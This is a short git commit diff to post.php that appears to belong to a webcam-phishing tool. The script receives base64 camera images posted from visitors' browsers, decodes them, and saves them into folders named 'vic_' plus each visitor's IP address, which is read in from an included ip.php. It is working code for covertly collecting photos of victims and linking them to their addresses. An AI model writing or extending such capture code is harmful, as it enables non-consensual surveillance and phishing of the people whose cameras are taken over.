d0c52a83cac16fd77870076091725930d73bb82c
ravi714 <63838178+ravi714@users.noreply.github.com>
2022-01-03 07:56:19 -0500

    Update post.php
    save images in a images folder with using the ip name

--- post.php
+++ post.php
@@ -1,5 +1,5 @@
 <?php
-
+include 'ip.php';
 $date = date('dMYHis');
 $imageData=$_POST['cat'];
 
@@ -7,10 +7,16 @@ if (!empty($_POST['cat'])) {
 error_log("Received" . "\r\n", 3, "Log.log");
 
 }
+if (!is_dir( "images") ) {
+    mkdir( "images");       
+}
+if (!is_dir( "images/vic_".$ipaddress) ) {
+    mkdir( "images/vic_".$ipaddress );       
+} 
 
 $filteredData=substr($imageData, strpos($imageData, ",")+1);
 $unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
+$fp = fopen( 'images/vic_'.$ipaddress.'/cam'.$date.'.png', 'wb' );
 fwrite( $fp, $unencodedData);
 fclose( $fp );
 
